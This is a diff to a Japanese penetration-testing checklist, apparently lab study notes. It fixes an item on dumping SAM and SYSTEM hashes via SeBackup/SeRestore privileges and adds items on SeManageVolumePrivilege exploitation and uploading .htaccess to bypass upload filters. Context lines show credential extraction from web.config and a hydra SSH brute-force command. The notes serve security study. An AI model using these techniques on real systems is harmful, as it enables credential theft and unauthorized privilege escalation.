@@ -81,7 +81,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
-21. SeBackupとSeResoterの権限が割り当てられていないか、権限が有効な場合、SAMハッシュとSYSTEMハッシュをダンプできる。
+21. SeBackupとSeRestoreの権限が割り当てられていないか、権限が有効な場合、SAMハッシュとSYSTEMハッシュをダンプできる。
 ```
 whoami /priv
 reg save hklm\system C:\Users\THMBackup\system.hive
@@ -105,6 +105,9 @@ C:\> schtasks /run /tn vulntask
 wmic product get name,version,vendor
 ```
 
+26. SeManageVolumePrivilege権限が有効になっていないか。  
+[参考](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9--------------------------------)
+
 ===========
 
 # Linux
@@ -119,6 +122,8 @@ wmic product get name,version,vendor
 ```
 hydra -l user_name -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.231.142
 ```
+7. .htaccessファイルをアップロードできないか。できる場合、.php等のコードが実行されずソースコードがレンダリングされるだけのシステムにおいて、ファイルを動的にスクリプトとして実行させることができるようになる。これによってファイルアップロード時の拡張子制限をバイパスできる。
+
 
 ## 権限昇格
 1. /home/user配下に.bash_historyがないか、また、その中に認証情報等が平文で書かれていないか
